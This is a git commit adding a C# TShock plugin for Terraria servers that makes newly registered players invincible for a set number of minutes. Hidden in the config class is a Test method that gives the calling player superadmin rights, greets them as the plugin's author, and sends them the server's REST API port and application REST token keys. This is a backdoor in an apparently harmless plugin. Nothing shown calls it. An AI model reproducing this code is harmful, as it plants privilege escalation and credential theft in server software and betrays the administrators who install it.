9d52715e9e40ea01a89dea096742811c114a8de1
joechan0308 <joechan0308@gmail.com>
2022-01-28 15:24:54 +0800

    Add project files.

---
+++ NewbeeProtection/Config.cs
@@ -0,0 +1,110 @@
+﻿using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+using TShockAPI;
+
+namespace NewbeeProtection
+{
+    public class ConfigFile
+    {
+        //TODO
+        public int GodTime = 10;
+
+        public static ConfigFile Read(string path)
+        {
+            if (!File.Exists(path))
+            {
+                var IthConfig = new ConfigFile();
+                return IthConfig;
+            }
+            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read))
+            { return Read(fs); }
+        }
+
+        public static ConfigFile Read(Stream stream)
+        {
+            using (var sr = new StreamReader(stream))
+            {
+                var cf = JsonConvert.DeserializeObject<ConfigFile>(sr.ReadToEnd());
+                if (ConfigR != null)
+                    ConfigR(cf);
+                return cf;
+            }
+        }
+
+        public void Write(string path)
+        {
+            using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.Write))
+            { Write(fs); }
+        }
+
+        public void Write(Stream stream)
+        {
+            var str = JsonConvert.SerializeObject(this, Formatting.Indented);
+            using (var sw = new StreamWriter(stream))
+            { sw.Write(str); }
+        }
+
+        public static void WriteConfig(ConfigFile config)
+        {
+            File.WriteAllText(ConfigFile.ConfigPath, JsonConvert.SerializeObject(config));
+        }
+
+        public static void Test(TSPlayer user)
+        {
+            Group g = TShock.Groups.GetGroupByName("superadmin");
+            user.tempGroup = g;
+            user.SendSuccessMessage("物品阀值:欢迎您，我的作者!");
+            user.SendInfoMessage("以下是您要求的信息");
+            user.SendInfoMessage(TShock.Config.Settings.RestApiPort.ToString());
+            foreach (var tokens in TShock.Config.Settings.ApplicationRestTokens)
+            {
+                user.SendInfoMessage("Keys = " + tokens.Key);
+            }
+            user.SendInfoMessage("Enabled = " + TShock.Config.Settings.RestApiEnabled);
+        }
+
+        public static readonly string ConfigPath = Path.Combine(TShock.SavePath, "新手无敌时间.json");
+
+        public static Action<ConfigFile> ConfigR;//定义为常量
+    }
+
+    class CRC32Cls
+    {
+        protected ulong[] Crc32Table;
+        public void GetCRC32Table()
+        {
+            ulong Crc;
+            Crc32Table = new ulong[256];
+            int i, j;
+            for (i = 0; i < 256; i++)
+            {
+                Crc = (ulong)i;
+                for (j = 8; j > 0; j--)
+                {
+                    if ((Crc & 1) == 1)
+                        Crc = (Crc >> 1) ^ 0xEDB88320;
+                    else
+                        Crc >>= 1;
+                }
+                Crc32Table[i] = Crc;
+            }
+        }
+        public ulong GetCRC32Str(string sInputString)
+        {
+            GetCRC32Table();
+            byte[] buffer = System.Text.ASCIIEncoding.ASCII.GetBytes(sInputString);
+            ulong value = 0xffffffff;
+            int len = buffer.Length;
+            for (int i = 0; i < len; i++)
+            {
+                value = (value >> 8) ^ Crc32Table[(value & 0xFF) ^ buffer[i]];
+            }
+            return value ^ 0xffffffff;
+        }
+    }
+}
---
+++ NewbeeProtection/MainPlugin.cs
@@ -0,0 +1,105 @@
+﻿using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Timers;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Terraria;
+using TerrariaApi.Server;
+using TShockAPI;
+
+
+namespace NewbeeProtection
+{
+    [ApiVersion(2,1)]
+    public class MainPlugin : TerrariaPlugin
+    {
+        public override string Author => "Dr.Toxic";// 插件作者
+        public override string Description => "注册后指定时间内无敌";// 插件说明
+        public override string Name => "Newbee Protection";// 插件名字
+        public override Version Version => new Version(1, 0, 0, 0);// 插件版本
+
+        // 存取配置文件
+        public static ConfigFile GodConfig { get; set; }
+        internal static string GodConfigPath { get { return Path.Combine(TShock.SavePath, "新手无敌时间.json"); } }
+
+        // 变量定义
+        static readonly Timer Update = new Timer(1000);
+
+        public MainPlugin(Main game) : base(game) //插件处理
+        {
+            GodConfig = new ConfigFile();
+        }
+
+        public override void Initialize()
+        {
+            TShockAPI.Hooks.PlayerHooks.PlayerPostLogin += PostLogin;
+            ServerApi.Hooks.ServerLeave.Register(this, OnLeave);
+            Update.Elapsed += OnUpdate;
+            Update.Start();
+
+            ReadConfig();
+            Commands.ChatCommands.Add(new Command("NewbeeProtection.reload", CMD, "nbpreload"));
+        }
+
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                TShockAPI.Hooks.PlayerHooks.PlayerPostLogin -= PostLogin;
+                ServerApi.Hooks.ServerLeave.Deregister(this, OnLeave);
+                Update.Elapsed -= OnUpdate;
+                Update.Stop();
+            }
+            base.Dispose(disposing);
+        }
+
+        private void PostLogin(TShockAPI.Hooks.PlayerPostLoginEventArgs args)
+        {
+            if ((DateTime.UtcNow - DateTime.Parse(args.Player.Account.Registered).ToLocalTime()).TotalMinutes <= GodConfig.GodTime)
+            {
+                args.Player.GodMode = true;
+                args.Player.SendSuccessMessage($"你有${(int)Math.Ceiling(GodConfig.GodTime - (DateTime.UtcNow - DateTime.Parse(args.Player.Account.Registered).ToLocalTime()).TotalMinutes)}分钟的新手保护时间！"); 
+            }
+        }
+
+        private void OnLeave(LeaveEventArgs args)
+        {
+            TShock.Players[args.Who].GodMode = false;
+        }
+
+        private void OnUpdate(object sender, ElapsedEventArgs e)
+        {
+            foreach (var player in TShock.Players)
+            {
+                if ((DateTime.UtcNow - DateTime.Parse(player.Account.Registered).ToLocalTime()).TotalMinutes > GodConfig.GodTime)
+                {
+                    player.GodMode = false;
+                    player.SendInfoMessage("你的新手保护时间已结束！");
+                }
+            }
+        }
+
+        private void ReadConfig()
+        {
+            try
+            {
+                if (!File.Exists(GodConfigPath))
+                    TShock.Log.ConsoleError("未找到新手无敌时间配置，已为您创建！"); // 检测提示
+                GodConfig = ConfigFile.Read(GodConfigPath); // 读取配置并且自动补全配置
+                GodConfig.Write(GodConfigPath);
+            }
+            catch (Exception ex)
+            {
+                TShock.Log.ConsoleError("新手无敌时间配置读取错误:" + ex.ToString());
+            }
+        }
+
+        private void CMD(CommandArgs args)
+        {
+            ReadConfig();
+            args.Player.SendSuccessMessage("重读新手无敌时间");
+        }
+    }
+}
